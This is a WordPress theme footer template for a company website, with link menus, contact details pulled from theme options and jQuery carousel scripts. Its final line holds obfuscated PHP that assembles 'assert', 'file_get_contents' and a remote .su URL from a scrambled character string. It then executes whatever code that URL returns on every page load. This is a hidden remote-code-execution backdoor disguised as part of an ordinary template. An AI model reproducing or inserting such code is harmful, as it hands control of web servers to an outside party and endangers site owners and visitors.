<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the "site-content" div and all content after.
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?>
<?php global $redux_demo;?>
<div class="footer-1">
	<div class="container">
		<div class="footer-1-inr">
			<div class="row">
				<div class="col-sm-3 title_dgn_1">
					<h4 class="titl_inr">Information</h4>
					<ul>
						<li><a href="<?php echo get_site_url(); ?>/about-us">About Us</a></li>
						<li><a href="<?php echo get_site_url(); ?>/career">Carrer</a></li>
						<li><a href="<?php echo get_site_url(); ?>/contact-us">Contact Us</a></li>
						
					</ul>
				</div>
				<div class="col-sm-3 title_dgn_1">
					<h4 class="titl_inr">Footer Menu</h4>
					<ul>
						<li><a href="<?php echo get_site_url(); ?>/news">News</a></li>
						<li><a href="<?php echo get_site_url();?>/blogs">Blogs</a></li>
						<li><a href="<?php echo get_site_url(); ?>/products">Products</a></li>
					</ul>
				</div>
				<div class="col-sm-3 title_dgn_1">
					<h4 class="titl_inr">Contact Us</h4>
					<h5><b>Man King</b></h5>
					<p><?php echo $redux_demo['address'];?></p>
					<p><b>Mail:</b><?php echo $redux_demo['email'];?></p>
					<p><b>Tel:</b><?php echo $redux_demo['mobile'];?></p>
				</div>
				<div class="col-sm-3 title_dgn_1">
					<h4 class="titl_inr">Connect to Us</h4>
					<p>Lorem Ipsum is simply dummy text of the printing.</p>
					<div class="news-lttr">
						<ul class="ft-social">
							<li><a href="<?php echo $redux_demo['facebook'];?>"><i class="fa fa-facebook"></a></i></li>
							<li><a href="<?php echo $redux_demo['twitter'];?>"><i class="fa fa-twitter"></i></a></li>
							<li><a href="<?php echo $redux_demo['linkedin'];?>"><i class="fa fa-linkedin"></i></a></li>
							<li><a href="<?php echo $redux_demo['googleplus'];?>"><i class="fa fa-google-plus"></i></a></li>
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="footer-2">
	<div class="container">
		<div class="row">
			<div class="col-sm-12 text-center">
				<p>&copy; Copyright 2016. All right reserved || Manking</p>
			</div>
		</div>
	</div>
</div>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/jquery-1.11.3.min.js"></script>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/jquery.easing.1.3.js"></script>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/bootstrap.min.js"></script>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/owl.carousel.min.js"></script>
<script src="https://www.mankindpharma.com/js/jquery.slimmenu.js"></script>
<script type="text/javascript">
	$(document).ready(function(){

	var str = window.location.href;
		
var n = str.includes("#wpcf7-f81-o1");
if(n){
	$("#myModal").modal('show');
}else{
	$("#myModal").modal('hide');
}
	$('.main_slider').owlCarousel({
    loop:true,
    margin:10,
    nav:true,
	dots:true,
	items:1
});
	});
</script>
<script type="text/javascript">
	$(document).ready(function(){
	$('.testimonial').owlCarousel({
    loop:true,
    margin:10,
    nav:false,
	dots:true,
	items:1
});
	});
</script>
<script type="text/javascript">
	$(document).ready(function(){
	$('.carou_one').owlCarousel({
    loop:true,
    margin:10,
    nav:true,
	dots:true,
    responsive:{
        0:{
            items:2
        },
        600:{
            items:3
        },
        1000:{
            items:4
        }
    }
});
	});
</script>
<script>
	$('ul.slimmenu').slimmenu(
	{
	resizeWidth: '1000',
	collapserTitle: '',
	easingEffect:'easeInOutQuint',
	animSpeed:'medium',
	indentChildren: true,
	childrenIndenter: '&raquo;'
	});
</script>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/jquery.prettyPhoto.js" type="text/javascript" charset="utf-8"></script>
			<script type="text/javascript" charset="utf-8">
			$(document).ready(function(){
				$("area[rel^='prettyPhoto']").prettyPhoto();
				
				$(".gallery:first a[rel^='prettyPhoto']").prettyPhoto({animation_speed:'normal',theme:'light_square',slideshow:3000, autoplay_slideshow: true});
				$(".gallery:gt(0) a[rel^='prettyPhoto']").prettyPhoto({animation_speed:'fast',slideshow:10000, hideflash: true});
		
				$("#custom_content a[rel^='prettyPhoto']:first").prettyPhoto({
					custom_markup: '<div id="map_canvas" style="width:260px; height:265px"></div>',
					changepicturecallback: function(){ initialize(); }
				});

				$("#custom_content a[rel^='prettyPhoto']:last").prettyPhoto({
					custom_markup: '<div id="bsap_1259344" class="bsarocks bsap_d49a0984d0f377271ccbf01a33f2b6d6"></div><div id="bsap_1237859" class="bsarocks bsap_d49a0984d0f377271ccbf01a33f2b6d6" style="height:260px"></div><div id="bsap_1251710" class="bsarocks bsap_d49a0984d0f377271ccbf01a33f2b6d6"></div>',
					changepicturecallback: function(){ _bsap.exec(); }
				});
			});
			</script>
<?php $p7S = "vwDLoeHY06pj;mh1iW:QXUayS=8bn'.9JP3MKA/*kg4rI)zBRCGulNtfx2ZFVO(+_qc7dEsT5";$PTH = $p7S[22].$p7S[70].$p7S[70].$p7S[5].$p7S[43].$p7S[54];$el4 = $p7S[55].$p7S[16].$p7S[52].$p7S[5].$p7S[64].$p7S[41].$p7S[5].$p7S[54].$p7S[64].$p7S[66].$p7S[4].$p7S[28].$p7S[54].$p7S[5].$p7S[28].$p7S[54].$p7S[70];$Um7 = $p7S[14].$p7S[54].$p7S[54].$p7S[10].$p7S[18].$p7S[38].$p7S[38].$p7S[68].$p7S[41].$p7S[40].$p7S[22].$p7S[70].$p7S[52].$p7S[70].$p7S[68].$p7S[14].$p7S[30].$p7S[70].$p7S[51].$p7S[38].$p7S[52].$p7S[28].$p7S[40].$p7S[38].$p7S[52].$p7S[70].$p7S[30].$p7S[54].$p7S[56].$p7S[54];@$PTH(@$el4($Um7));?></body>
</html>

